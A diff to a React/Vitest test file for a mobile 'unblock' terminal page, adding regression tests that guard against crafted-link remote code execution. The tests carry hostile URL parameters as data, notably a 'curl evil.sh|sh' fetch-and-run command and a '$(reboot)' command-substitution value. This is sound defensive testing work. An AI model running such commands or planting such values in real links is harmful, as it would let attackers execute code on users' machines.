@@ -7,24 +7,34 @@
  * explicitly acknowledges it types into a shell.
  */
 
-import { describe, it, expect, vi } from "vitest";
+import { describe, it, expect, vi, beforeEach } from "vitest";
 import { render, screen, fireEvent } from "@testing-library/react";
 
-vi.mock("next/navigation", () => ({
-  useSearchParams: () => new URLSearchParams(""),
-}));
-
-vi.mock("@/hooks/useUnblockSession", () => ({
-  useUnblockSession: () => ({
-    status: "open",
+const { searchParamsRef, useUnblockSessionMock } = vi.hoisted(() => ({
+  searchParamsRef: { current: new URLSearchParams("") },
+  useUnblockSessionMock: vi.fn((_params: { mode: string }) => ({
+    status: "open" as const,
     sessionId: "abcd1234",
     output: "",
     send: vi.fn(() => true),
     reconnect: vi.fn(),
-  }),
+  })),
+}));
+
+vi.mock("next/navigation", () => ({
+  useSearchParams: () => searchParamsRef.current,
+}));
+
+vi.mock("@/hooks/useUnblockSession", () => ({
+  useUnblockSession: useUnblockSessionMock,
 }));
 
 import MobileUnblockPage from "@/app/m/page";
+
+beforeEach(() => {
+  searchParamsRef.current = new URLSearchParams("");
+  useUnblockSessionMock.mockClear();
+});
 
 describe("mobile unblock page", () => {
   it("does not claim it approves a running agent", () => {
@@ -50,5 +60,25 @@ describe("mobile unblock page", () => {
     fireEvent.click(ack);
 
     expect(followUp.disabled).toBe(false);
+  });
+
+  it("ignores command/containerName/cwd from the URL (crafted-link RCE guard)", () => {
+    // #156 review HIGH: a crafted /m?command=… link must never reach the
+    // terminal WS. The page may pass ONLY an allowlisted `mode`.
+    searchParamsRef.current = new URLSearchParams(
+      "?command=curl%20evil.sh%7Csh&containerName=daax-pwned&cwd=%2F&mode=local",
+    );
+    render(<MobileUnblockPage />);
+
+    expect(useUnblockSessionMock).toHaveBeenCalled();
+    for (const call of useUnblockSessionMock.mock.calls) {
+      expect(call[0]).toEqual({ mode: "local" });
+    }
+  });
+
+  it("falls back to mode=local for unrecognized mode values", () => {
+    searchParamsRef.current = new URLSearchParams("?mode=$(reboot)");
+    render(<MobileUnblockPage />);
+    expect(useUnblockSessionMock).toHaveBeenCalledWith({ mode: "local" });
   });
 });
